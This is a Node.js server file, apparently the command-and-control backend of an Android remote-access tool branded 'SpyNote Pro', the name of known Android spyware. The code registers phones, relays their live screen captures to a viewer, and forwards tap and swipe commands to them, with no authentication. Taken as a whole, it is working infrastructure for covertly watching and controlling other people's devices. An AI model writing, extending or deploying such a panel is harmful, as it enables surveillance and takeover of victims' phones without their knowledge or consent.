const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { 
        origin: "*", 
        methods: ["GET", "POST"],
        credentials: true 
    },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 50e6 // 50MB for HD frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { 
            model, brand, version, status, 
            connected: true, timestamp: Date.now() 
        });
        console.log("✅ Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// 🔥 PERFECT SOCKET HANDLING
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                timestamp: Date.now()
            });
            socket.join(deviceId);
            console.log("📱 Device LIVE:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        console.log('🎯 Device selected:', data.deviceId);
    });

    // 🔥 ULTRA FAST SCREEN RELAY
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', data);
        }
    });

    // 🔥 INSTANT CONTROL RELAY
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            io.to(deviceId).emit('control', {
                action, 
                x: Number(x) || 0, 
                y: Number(y) || 0,
                startX: Number(startX) || 0, 
                startY: Number(startY) || 0,
                endX: Number(endX) || 0, 
                endY: Number(endY) || 0
            });
            console.log('🎮 INSTANT CONTROL:', action, '->', deviceId);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

// Cleanup old devices
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (!info.connected && (now - info.timestamp) > 300000) { // 5min
            devices.delete(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 60000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote Pro Server: http://localhost:${PORT}`);
    console.log(`📱 Ready for Android 14+ devices!`);
});
